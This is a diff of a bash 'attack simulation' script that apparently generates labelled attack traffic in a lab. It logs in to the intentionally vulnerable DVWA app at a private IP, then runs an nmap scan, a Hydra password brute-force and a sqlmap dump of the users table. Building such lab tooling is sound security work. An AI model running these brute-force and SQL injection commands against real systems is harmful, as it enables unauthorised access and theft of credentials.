@@ -1,20 +1,9 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-LOG_FILE="${1:-/logs/attack_log.txt}"
-TARGET_IP="${2:-10.10.0.10}"
-
-# Resolve passwords file location
-if [ -f "/root/attacks/passwords.txt" ]; then
-    PASSWORDS_FILE="/root/attacks/passwords.txt"
-elif [ -f "./attacker/passwords.txt" ]; then
-    PASSWORDS_FILE="./attacker/passwords.txt"
-else
-    PASSWORDS_FILE="passwords.txt"
-fi
-
-# Ensure log directory exists
-mkdir -p "$(dirname "$LOG_FILE")"
+LOG_FILE="/logs/attack_log.txt"
+TARGET_IP="10.10.0.10"
+PASSWORDS_FILE="/root/attacks/passwords.txt"
 
 # Helper for UTC ISO-8601 timestamps
 timestamp() {
@@ -30,62 +19,87 @@ log_event() {
 }
 
 echo "=== Initializing Attack Simulation Engine ==="
+mkdir -p /logs /captures
+pkill -9 -x hydra 2>/dev/null || true
+rm -f /root/attacks/hydra.restore 2>/dev/null || true
 
 # 1. Obtain Authenticated Session Cookie from DVWA
+echo "[+] Ensuring DVWA database is initialized..."
+curl -s -d "create_db=Create%20%2F%20Reset%20Database" "http://${TARGET_IP}/setup.php" > /dev/null 2>&1 || true
+
 echo "[+] Logging in to DVWA to acquire authenticated session cookie..."
-LOGIN_HTML=$(curl -s "http://${TARGET_IP}/login.php")
+COOKIE_JAR="/tmp/dvwa_cookies.txt"
+rm -f "$COOKIE_JAR"
+
+# Request login page to obtain initial session cookie in COOKIE_JAR and extract matching CSRF token
+LOGIN_HTML=$(curl -s -c "$COOKIE_JAR" "http://${TARGET_IP}/login.php")
 USER_TOKEN=$(echo "$LOGIN_HTML" | grep -oP "name='user_token' value='\K[a-f0-9]+" || true)
-PHPSESSID=$(curl -s -i "http://${TARGET_IP}/login.php" | grep -oP "PHPSESSID=\K[^;]+" | head -n 1 || true)
+PHPSESSID=$(grep "PHPSESSID" "$COOKIE_JAR" | awk '{print $7}' || true)
 
-if [ -z "$PHPSESSID" ]; then
-    # Fallback if first request didn't return cookie
-    PHPSESSID=$(curl -s -c - "http://${TARGET_IP}/login.php" | grep "PHPSESSID" | awk '{print $7}' || true)
-fi
-
-# Submit credentials
-curl -s -b "PHPSESSID=${PHPSESSID}; security=low" \
+# Authenticate session using the matching token and session ID
+curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
      -d "username=admin&password=password&Login=Login&user_token=${USER_TOKEN}" \
      "http://${TARGET_IP}/login.php" > /dev/null
+
+# Also set security level to low explicitly
+curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+     -d "security=low&seclev_submit=Submit" \
+     "http://${TARGET_IP}/security.php" > /dev/null || true
 
 echo "[+] Authenticated session established: PHPSESSID=${PHPSESSID}"
 sleep 2
 
 # ----------------------------------------------------
-# Attack 1: Nmap Service & Port Scan
+# Attack Functions (100% Independent & Decoupled)
 # ----------------------------------------------------
-log_event "START" "nmap_scan"
-echo "[+] Running Nmap scan against ${TARGET_IP}..."
-NMAP_OUT="$(dirname "$LOG_FILE")/nmap_results.txt"
-nmap -sV -sT -p 1-1000 "${TARGET_IP}" -oN "$NMAP_OUT" || true
-log_event "END" "nmap_scan"
+attack_nmap() {
+    log_event "START" "nmap_scan"
+    echo "[+] Running Nmap scan against ${TARGET_IP}..."
+    nmap -sV -sT -p 1-1000 "${TARGET_IP}" -oN /logs/nmap_results.txt || true
+    log_event "END" "nmap_scan"
+}
 
-sleep 5  # Inter-attack cooldown for distinct network boundary
+attack_hydra() {
+    log_event "START" "hydra_bruteforce"
+    echo "[+] Running Hydra brute force against DVWA..."
+    local target_user="${TARGET_USER:-admin}"
+    timeout 60 hydra -l "${target_user}" -P "${PASSWORDS_FILE}" "${TARGET_IP}" http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${PHPSESSID}; security=low:F=incorrect" \
+      -t 4 -w 5 -vV -o /logs/hydra_results.txt || true
+    log_event "END" "hydra_bruteforce"
+}
 
-# ----------------------------------------------------
-# Attack 2: Hydra Form Brute Force
-# ----------------------------------------------------
-log_event "START" "hydra_bruteforce"
-echo "[+] Running Hydra brute force against DVWA..."
-HYDRA_OUT="$(dirname "$LOG_FILE")/hydra_results.txt"
-hydra -l admin -P "${PASSWORDS_FILE}" "${TARGET_IP}" http-get-form \
-  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${PHPSESSID}; security=low:F=username and/or password incorrect" \
-  -vV -o "$HYDRA_OUT" || true
-log_event "END" "hydra_bruteforce"
+attack_sqlmap() {
+    log_event "START" "sqlmap_sqli"
+    echo "[+] Running sqlmap against DVWA SQLi endpoint..."
+    sqlmap -u "http://${TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit" \
+      --cookie="PHPSESSID=${PHPSESSID}; security=low" \
+      --batch \
+      --dump -T users -D dvwa \
+      --output-dir=/logs/sqlmap_out || true
+    log_event "END" "sqlmap_sqli"
+}
 
-sleep 5  # Inter-attack cooldown
-
-# ----------------------------------------------------
-# Attack 3: sqlmap SQL Injection & Data Dump
-# ----------------------------------------------------
-log_event "START" "sqlmap_sqli"
-echo "[+] Running sqlmap against DVWA SQLi endpoint..."
-SQLMAP_OUT="$(dirname "$LOG_FILE")/sqlmap_out"
-sqlmap -u "http://${TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=${PHPSESSID}; security=low" \
-  --batch \
-  --dump -T users -D dvwa \
-  --output-dir="$SQLMAP_OUT" || true
-log_event "END" "sqlmap_sqli"
+# Determine which attacks to run (default: all)
+MODE="${1:-all}"
+case "$MODE" in
+    nmap|recon)
+        attack_nmap
+        ;;
+    hydra|brute)
+        attack_hydra
+        ;;
+    sqli|sqlmap)
+        attack_sqlmap
+        ;;
+    all|*)
+        attack_nmap
+        sleep 5  # Inter-attack cooldown for distinct network flow boundaries
+        attack_hydra
+        sleep 5  # Inter-attack cooldown
+        attack_sqlmap
+        ;;
+esac
 
 echo "=== Attack Simulation Completed Successfully ==="
 echo "[+] Log summary stored in ${LOG_FILE}:"
